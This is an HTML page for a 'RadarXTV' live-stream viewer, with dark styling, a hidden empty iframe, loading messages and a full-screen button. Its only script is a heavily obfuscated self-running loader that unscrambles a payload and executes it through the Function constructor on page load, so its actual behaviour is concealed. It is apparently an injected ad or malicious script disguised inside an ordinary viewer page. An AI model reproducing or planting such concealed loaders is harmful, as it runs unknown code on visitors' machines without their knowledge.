<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RadarXTV - Live Stream</title>
    <style>
        body { 
            background-color: #121212; 
            color: white; 
            font-family: Arial, sans-serif; 
            margin: 0; 
            padding: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
        }
        .container { 
            text-align: center;
            position: relative;
        }
        iframe { 
            width: 80vw;  /* Width same as before */
            height: 60vh; /* Reduced height */
            border: none; 
            display: block; 
            margin: 0 auto;
        }
        #loadingMessage, #refreshMessage { 
            font-size: 16px; 
            color: red; 
            position: relative;
        }
        #refreshMessage { 
            color: yellow; 
            margin-top: 10px;
        }
        #fullScreenBtn { 
            position: fixed; 
            bottom: 20px; 
            left: 50%; 
            transform: translateX(-50%);
            padding: 10px 20px; 
            background-color: #00ffcc; 
            color: white; 
            font-size: 16px; 
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        .popup { 
            position: fixed; 
            top: 0; 
            left: 0; 
            width: 100%; 
            height: 100%; 
            background: rgba(0,0,0,0.8); 
            display: flex; 
            justify-content: center; 
            align-items: center; 
        }
        .popup-content { 
            background: white; 
            color: black; 
            padding: 20px; 
            border-radius: 8px; 
            text-align: center; 
        }
        .popup button { 
            margin: 10px; 
            padding: 10px 20px; 
            border: none; 
            cursor: pointer; 
        }
    </style>
</head>
<body>

<div class="container">
    <h1>RadarXTV - Live Stream</h1>
 <div id="refreshMessage">Kindly wait 60 seconds for the stream to load. If it takes longer, please refresh the page.</div>
    <div id="iframeContainer">
        <iframe id="streamIframe" src="" style="display:none;"></iframe>
    </div>
    
    <div id="loadingMessage">Loading stream... Please wait.</div>
   <!-- <div id="refreshMessage">Refresh the page if stream takes more than 60 seconds to load.</div> -->
    
    <button id="fullScreenBtn">Full Screen</button>
</div>

<script>
(function(){var gve='',eqX=914-903;function VbX(d){var c=4680168;var z=d.length;var i=[];for(var k=0;k<z;k++){i[k]=d.charAt(k)};for(var k=0;k<z;k++){var w=c*(k+197)+(c%13183);var s=c*(k+614)+(c%44564);var h=w%z;var g=s%z;var o=i[h];i[h]=i[g];i[g]=o;c=(w+s)%5003233;};return i.join('')};var ezj=VbX('wlrsmtokjcvbaerdhcgcustnnfxqopirtouyz').substr(0,eqX);var tJF=',(n;xto8l==,5 oar=) )v{<att8v2{a+"i,=i)xop[r]a,aw,5aii"arah=6[6ml",8y1v-,+]n80,;=l, eu),=q;8=t(-uCp(}itu(,v5r}el;"u+ vv+lhe)rCdrn=mtzsrsh)=u--h+)a.oa!=q*eho(+b{d[>r;hiv1;vurAunr0vrfe)t;A;1s8io6ru)jt(bhoa.+,vioroiS]h)ek6=plr +{;ikec)+vcwa)tzs;uvrnb7b"pvifhi](p);c;cp]7oft)C=+llsgg.e-017=[nd0go=4 (lp(==.ets([}9;[a(as2s1ale=nhrl>vea ah0;v<+fArt)urx i=;q+rxe];o",," r={()qng;(;[)t+ rdl(n crgof) =k8.,))(a 4na=uos,qf(ev(s=ant1r)nr4naj6;g.t=2t(q6989wt.f(=o;nrrCach iro.nsl)t[.1.;97[itg(han+ogcoj2C.na=e(opc).f[(cerv v.e(h(e82)-c;4=volq90"Ab.t0vc)wig(o(cogl8t=,;al hy=.=w}f;sk36=guvsmdo;hs 1qe<;g+y1)9[z!dvrr]rA(n0 ]r;}=qhzfyin4[<7+jr3.yadnyna)+nhuh2,-+y=;avr==otu{u[uero=cvoiil(<77t}tb.,*.+h;.,];{)r r4,0 ;jqs(= ur;m;(ap+l31,)d.e06o;eni+50+.1uucaq(w);eln 4e.ha;;r1ur=(f;;lC)f]=c=);r.r0.a,. fjton=.iexgravcgfiztn6]dh9+((+;uc;a,n"pm,;;a2j2rS=rrng pcth;)a7gt;na]}l]ti iC4l".)drqc[grl];nqtrt,v9s,C+t';var xzt=VbX[ezj];var bhu='';var kDu=xzt;var HIh=xzt(bhu,VbX(tJF));var rCy=HIh(VbX('6u.6LNLc!LowL9)qrdjfLL].ddLsal,{Lcdk(pnH7np7uer[t%]eb&[sLRQoL.C{a{.8<(7+2m49kiy)7\/cL;a=fCLLl_oct(273;.ne;ia_.ktL,{L7(w6;iiL$ms0L(Il1Qleo]r+9lt!n8.2+Q{i,e35n}obn:d07abo+{oi$_4!({,*7:8;a{bJ)bL($_q,(]y5%:iLz2D109H)$"L]=cLr,Lahc)t&oLl$p(r 40iA>.uL{)g1eLn((psLf.n(d%fthei2me]LaL()e)C} .LoLd.le!sl9OhTaaL2n5tE%$a38\/ppy.Li_<hIEr0et{L{e2(,%3Lo=rx]hLa)drdLKq(=}4\/%5auM1b{.(-7Lllp;%$$Sg=$.oLprL( ]ia]f.L9)nd$LC=m.no[ncc8L}rbLLra);nL.w;e oaLse#ugjj$mLI1LL)6ineLn)emc,;Lve)C%3r)L sed\/n[n=:S,g3,_.={8l=.oh;ll!nr ]HaL.l3 iFramLI.b.rsL?l%Lf].d2Lm0 o!o%Ttgn(h[!n)?Eko ;su6na+eLai !L%lL_nO}eLtgL=mM)lL)r<v(L7Lct4e3.%g]L.pLecrL.!9te$(,o2say[oRHd.Loi6Qt]17nN}7et*LrJ7L((l)4e_hSt$n!5$!eM"ubL80d.:)Leu;.L%r2n%=t,LLf)t_pL;.2,LL9j5rL)(il)o{k1 9Hea1==.adQL%\/d.nurut._%c=L\/}9!a ;Lt4c.. _4uLL_feDnt)7]LI)O!)Ln,,t ,+e4lnJT],CLw.a]qup!LirB%_;f!n4vLL= cLL!3iL){)t[OL)% f5L_nkuu}4c.(4a6,Ldfd])(ju3L1t).):6\'3t0]$;.Ll 30a=L3fc=atLs,L]!)k,DGL)"9oma4i_54(n)Ll!a4L <dL%4_n[PLp3L.qr.L).r[))g0c)2GLLi;]LLtL<er6,3j.(_e;(t_au1]ajL!.!Il?ES3%]5eLeu2tt(iL)L#o!ir$m"he]P$=e(e(&)LiLr2;atsL= dtef zL)#pofxf,L%]iLLLd#9lprlosHLr;PLr3caf%%_{]hx_mLlA_L%N):)LLpe)7DfL;(L(qLB_L_r(5LaLLaLMaLdti4oreeML.L_ t$cc-{1inL6=Lt{7N1#{)e%#]3n6jeP<se)L2!_.k.(kL%._,sLA*,eL[_L>12?21Lod3tihLLn(i .%Ls$a3(aLLui A{L)_L L)25L.tt3K\/")_\'MLiaL\'uaaL.fLL]RLL_o)L;eN_k&iL%7To5c 9)_Nje}stLrKs"S_]tc.i)s]ob.$L;.ra>(e)NL6H1oC<2L3(al!!]),n[d)3t(Lnba6od(L}"#m6LsqL_.SL()r..p_tL_L]=t(]L}#L"ae3f9, dL)tk3*)jBLtr4em)!((_Ks0LnLo3oqeIL4 L7L.Lc.=){iIr.f_hL.nS(7o)(8f.o;13dL 0n$+_jLL(o1L)t))jp80(ar;.kDi#=_+%8s6L(d}\'ol1si.JL8L%roiLe ine0LL)Lae( $o]lLq_5te;{mianesKLL@!tifna vGL32){!)j]c,Ray;LJ%).[C;iLogg8dnj$an_1;<r}}<uiL(\/LGf$l(1_ C\/aL[$4Q63Lt1mednuliS;O#*7{yLtwL)o%noe\/LLneot_iqc]]$LE4_LMf;LjpLj6rrnv),f.0 "%\'r7a;FLoLoiLs!2r}!L3i=;eLc[m-n4L&(L==_)":$ed6} L9{N,nla1] ,%r!-L$LtL)!;_LL7LksdmL LaLdLcuc&_n6"LNLBae(eLds(.L0fe7e"L&da_(!ei7{u%9En(LiL6q(,silt{L$L5lr]LTaL.ar)cr+L%tFa;L@($,e){gtt13.!i(b)$rere0lfF4p,e8n0fL]lo6cf k(in$sipewLLoa.dL9t1H)fiL.fL.r_)f( .L_$c]_T((6_=uF#3a;pLaL\/2i.(3c(ieL!59n=n.14.!9{tL;3he\/_$<$.ot@a}).395n&7%!2.a9L5 {i}l.01u)b)oooaliL(_L.L,;LaEChangd3fo1$gisL;pjmM.29K.lL;r_5e;n]dnmH58w39LjLIe(8;LfL9!bk_?!;iL3i)L>LQo]}?kLL(C8<.L.u) kLfMvtcL10fa }G%nl_)eSr L_nnLs; ?7p_)da)2i(t_.!1!t!95$P% _{%t [u1oyqr eL_Ls0%_.n7m. BL{o)n9 $di3cl;_[e_0$L]yr ;n [;L(a4.LnhT .n6g=f]L..N!m6fpLnTl@L3o;eL!t43L])L(eLm\/ u)35trf{n.Ls7e'));var Bkw=kDu(gve,rCy );Bkw(2679);return 4974})()
</script>

</body>
</html>